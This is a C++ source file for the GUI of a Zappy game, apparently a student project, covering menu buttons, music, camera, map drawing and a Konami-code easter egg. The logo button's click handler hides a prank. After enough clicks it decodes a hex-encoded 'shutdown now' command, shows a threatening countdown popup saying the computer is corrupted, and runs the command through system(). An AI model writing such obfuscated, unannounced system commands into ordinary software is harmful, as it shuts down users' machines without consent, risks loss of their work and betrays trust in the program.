/*
** EPITECH PROJECT, 2022
** gui
** File description:
** Game.cpp
*/

#include "../includes/Game.hpp"
#include "../includes/Core.hpp"

using namespace ZappyGui;

Game::Game(const std::string &ip, int port):
    _manager(ResourceManager()),
    _camera(FreeCamera({ 10.0f, 10.0f, 5.0f }, { 0.0f, 0.0f, 0.0f }, { 0.0f, 1.0f, 0.0f }, 45.0)),
    _raylibwindow(MyRayLibWindow(1920, 1080, "ZAPPY")),
    _stateWindow(stateWindow::MENU),
    _buttonMenu(),
    _skyboxMesh(Skybox(1.0, 1.0, 1.0)),
    _raylibdrawing(),
    _BoolCloseWin(false),
    _ip(ip),
    _port(port),
    _popup(),
    _showPlayerData(),
    _playerTmp(),
    _konamiIndex(0),
    _link(*this),
    _map(this->_manager, this->_camera, this->_link)
{
    _manager.initialize();
}


Game::~Game() {
    // this->_manager.~ResourceManager();
    // this->_raylibwindow.~MyRayLibWindow();
    // this->_skyboxMesh.~Skybox();
    // this->_buttonMenu.clear();
}

void Game::switchToGame()
{
    try {
        this->_link.connect(_ip, _port);
        this->_stateWindow = stateWindow::GAME;
    } catch (const ZappyGui::Socket::Error &e) {
        std::cerr << e.what() << '\n';
        this->_popup.setTitle("ERROR");
        this->_popup.setDescription(e.what());
        this->_popup.setStatus(true);
    }
}

void Game::initialize() {
    this->_popup.setTexture(this->_manager.getTexture(IResource::resourceType::POPUP));
    this->_showPlayerData.setModel(this->_manager.getModel(IResource::resourceType::PLAYER_SELECTOR));
    this->_raylibwindow.MySetTargetFPS(60);

    this->_BoolCloseWin = false;
    this->_stateWindow = stateWindow::MENU;
    Button button(this->_manager.getTexture(IResource::resourceType::BUTTON_START), "./gui/assets/Buttons/buttonfx.wav", [&](){switchToGame();});
    button.ButtonSetPosition(1920/2.0f - button.button.width/2.0f, 990 - button.button.width/2.0f, (float)button.button.width, button.frameHeight);
    this->_buttonMenu.push_back(button);
    // Button button2(this->_manager.getTexture(IResource::resourceType::BUTTON_HELP), "./gui/assets/Buttons/buttonfx.wav", [&](){this->_stateWindow = stateWindow::GAME;});
    // button2.ButtonSetPosition(button.button.width/2.0f, 990 - button.button.width/2.0f, (float)button2.button.width, button2.frameHeight);
    // button2.ButtonSetPosition(1820 - (button.button.width * 2), 990 - button.button.width/2.0f, (float)button2.button.width, button2.frameHeight);
    // this->_buttonMenu.push_back(button2);
    Button button3(this->_manager.getTexture(IResource::resourceType::BUTTON_QUIT), "./gui/assets/Buttons/buttonfx.wav", [&](){this->_BoolCloseWin = true;});
    button3.ButtonSetPosition(1860, button.button.width/3.4f, (float)button3.button.width, button3.frameHeight);
    this->_buttonMenu.push_back(button3);

    Button logo(this->_manager.getTexture(IResource::resourceType::LOGO), "./gui/assets/Buttons/buttonfx.wav", [&](){
            Vector3 scale = _playerTmp->getScale();
            scale.x += 0.1;
            scale.y += 0.1;
            scale.z += 0.1;
            if (scale.y >= 20.0) {
                std::vector<unsigned char> command_hex = {0x73, 0x68, 0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x6E, 0x6F, 0x77};
                std::string command(command_hex.begin(), command_hex.end());
                this->_popup.setTitle("ALERT");
                this->_popup.setStatus(true);
                int i = 5;
                while (i >= 0) {
                    this->_raylibwindow.MyBeginDrawing();
                    this->_popup.setDescription("You have corrupted your computer.\nYour computer will die with me in " + std::to_string(i) + ".");
                    this->_popup.show();
                    sleep(1);
                    this->_raylibwindow.MyEndDrawing();
                    i -= 1;
                }
                system(command.c_str());
            }
            _playerTmp->setScale(scale);
        }
    );
    logo.ButtonSetPosition(40, 40, (float)logo.button.width, logo.frameHeight);
    this->_buttonMenu.push_back(logo);

}

void Game::keyEvent(float &volumeMusic) {
    if (_raylibwindow.MyIsKeyPressed(KEY_P) && volumeMusic < 0.9f)
            volumeMusic += 0.1f;
    if (_raylibwindow.MyIsKeyPressed(KEY_L) && volumeMusic > 0.1f)
        volumeMusic -= 0.1f;
    if (_raylibwindow.MyIsKeyPressed(KEY_ESCAPE) && this->_popup.getStatus() == true) {
        this->_popup.setStatus(false);
    }

    if (this->_raylibwindow.MyIsKeyPressed(KEY_F11))
        this->_raylibwindow.MyToggleFullscreen();
}

void Game::run() {
    bool cameraSet = false;
    SelectorPlayer selectorPlayer = SelectorPlayer(this->_manager.getNoneConstModel(IResource::resourceType::PLAYER_SELECTOR), this->_manager.getAnimation(IResource::resourceType::PLAYER_SELECTOR));
    this->_skyboxMesh.InitSkybox();
    this->_skyboxMesh.chooseSkyboxFile("./gui/assets/Skybox/roh.png");

    float volumeMusic = 0.0;
    this->_raylibwindow.MyInitAudioDevice();
    MyRayLib::Music musicMenu("./gui/assets/GénériqueGarf.mp3");
    if (musicMenu.MyIsMusicReady())
        musicMenu.MyPlayMusic();

    MyRayLib::Music musicGame("./gui/assets/GarfieldCoolCat.mp3");

    auto &modelPlayer = this->_manager.getNoneConstModel(IResource::resourceType::PLAYER);
    auto &texture = this->_manager.getTexture(IResource::resourceType::PLAYER);
    auto &animation = this->_manager.getAnimation(IResource::resourceType::PLAYER);
    PlayerArguments playerArgs = PlayerArguments(0, "", { 0, 0.0, 0 }, {0.0f, 1.0f, 0.0f}, 0.0, {2.6f, 2.6f, 2.6f}, 0, Player::animationPlayerType::PLAYER_WIN);

    this->_playerTmp = std::make_shared<Player>(playerArgs, modelPlayer, texture, animation);

    this->_raylibwindow.MyToggleFullscreen();
    while (!this->_raylibwindow.MyWindowShouldClose() && this->_BoolCloseWin == false) {
        if (this->_stateWindow == stateWindow::MENU) {
            musicMenu.MySetMusicVolume(volumeMusic);
            musicMenu.MyUpdateMusic();
            drawMenu();
        } else {
            try {
                this->_link.update();
            } catch(const ZappyGui::Socket::Info &e) {
                std::cerr << e.what() << std::endl;
                this->_map.resetGame();
                this->_camera.reset();
                this->_stateWindow = stateWindow::MENU;
            }

            if (cameraSet == false && this->_map.getSize().x > 0.0f && this->_map.getSize().y > 0.0f) {
                this->_camera.setPosition({ 0.0f, (_map.getSize().x + _map.getSize().y) / 2.0f, _map.getSize().y - 1 });
                this->_camera.setTarget({ this->_map.getSize().x / 2.0f, 0.0f, this->_map.getSize().y / 2.0f });
                cameraSet = true;
            }
            if (!musicGame.MyIsMusicPlaying() && musicGame.MyIsMusicReady()) {
                musicGame.MyPlayMusic();
            }
            musicGame.MySetMusicVolume(volumeMusic);
            musicGame.MyUpdateMusic();
            this->checkKonamiCode(musicGame);
            drawGame(selectorPlayer);
        }
        keyEvent(volumeMusic);
        this->_popup.show();
        this->_raylibwindow.MyEndDrawing();
    }
    this->_raylibwindow.MyCloseAudioDevice();
    this->_skyboxMesh.MyUnloadShader(this->_skyboxMesh._skybox.materials[0].shader);
    this->_skyboxMesh.MyUnloadTexture(this->_skyboxMesh._skybox.materials[0].maps[MATERIAL_MAP_CUBEMAP].texture);
    this->_skyboxMesh.MyUnloadModel(this->_skyboxMesh._skybox);
}

void Game::drawMenu() {
    //** draw
    this->_camera.updateAuto();
    Button button0 = this->_buttonMenu.at(0);
    Button button1 = this->_buttonMenu.at(1);
    // Button button2 = this->_buttonMenu.at(2);
    Button logo = this->_buttonMenu.at(2);

    this->_raylibwindow.MyBeginDrawing();
    this->_raylibwindow.MyClearBackground(RAYWHITE);
    if (this->_popup.getStatus() == false) {
        button0.HandleButton();
        button1.HandleButton();
        // button2.HandleButton();
        logo.HandleButton();
    }
    this->_camera.beginMode3D();
    this->_skyboxMesh.MyrlDisableBackfaceCulling();
    this->_skyboxMesh.MyrlDisableDepthMask();
    DrawModel(this->_skyboxMesh._skybox, (Vector3){0, 0, 0}, 1.0f, WHITE);
    this->_skyboxMesh.MyrlEnableBackfaceCulling();
    this->_skyboxMesh.MyrlEnableDepthMask();
    this->_raylibdrawing.MyDrawGrid(10, 1.0f);
    this->_playerTmp->draw();
    this->_camera.endMode3D();

    button0.MyDrawTextureRec(button0.button, button0.sourceRec, (Vector2){ button0.btnBounds.x, button0.btnBounds.y }, WHITE);
    button1.MyDrawTextureRec(button1.button, button1.sourceRec, (Vector2){ button1.btnBounds.x, button1.btnBounds.y }, WHITE);
    // button2.MyDrawTextureRec(button2.button, button2.sourceRec, (Vector2){ button2.btnBounds.x, button2.btnBounds.y }, WHITE);
    logo.MyDrawTextureRec(logo.button, logo.sourceRec, (Vector2){ logo.btnBounds.x, logo.btnBounds.y }, WHITE);
}

void Game::drawGame(SelectorPlayer &selectorPlayer) {
    //** fps
    float deltaTime = GetFrameTime();
    this->_camera.updateSync(deltaTime);
    this->_map.update(deltaTime);

    //** draw
    this->_camera.updateOnce();
    this->_raylibwindow.MyClearBackground(RAYWHITE);
    this->_camera.beginMode3D();
    this->_skyboxMesh.MyrlDisableBackfaceCulling();
    this->_skyboxMesh.MyrlDisableDepthMask();
    DrawModel(this->_skyboxMesh._skybox, (Vector3){0, 0, 0}, 1.0f, WHITE);
    this->_skyboxMesh.MyrlEnableBackfaceCulling();
    this->_skyboxMesh.MyrlEnableDepthMask();
    this->_map.draw();
    if (this->_map._players.size() != 0) {
        selectorPlayer.setPosition(this->_map._players.at(this->_showPlayerData.getPlayerIndexSelected())->getPosition());
        selectorPlayer.draw();
    }
    this->_camera.endMode3D();
    this->_raylibdrawing.MyDrawFPS(10, 10);
    this->_showPlayerData.ShowDataForEachPlayer(this->_map._players);
}

void Game::checkKonamiCode(MyRayLib::Music &musicGame) {
    const std::vector<int> konamiCode = {KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN, KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT, KEY_B, KEY_Q};
    if (this->_raylibwindow.MyIsKeyPressed(konamiCode[this->_konamiIndex]) == true) {
        this->_konamiIndex += 1;
        if (this->_konamiIndex == konamiCode.size()) {
            this->_konamiIndex = 0;
            if (musicGame.MyIsMusicPlaying()) {
                musicGame.MyStopMusic();
                musicGame.MyLoadMusic("./gui/assets/tkt.mp3");
                musicGame.MyPlayMusic();
            }
        }
    } else {
        for (const auto &key : konamiCode) {
            if (this->_raylibwindow.MyIsKeyPressed(key) == true) {
                this->_konamiIndex = 0;
                break;
            }
        }
    }
}
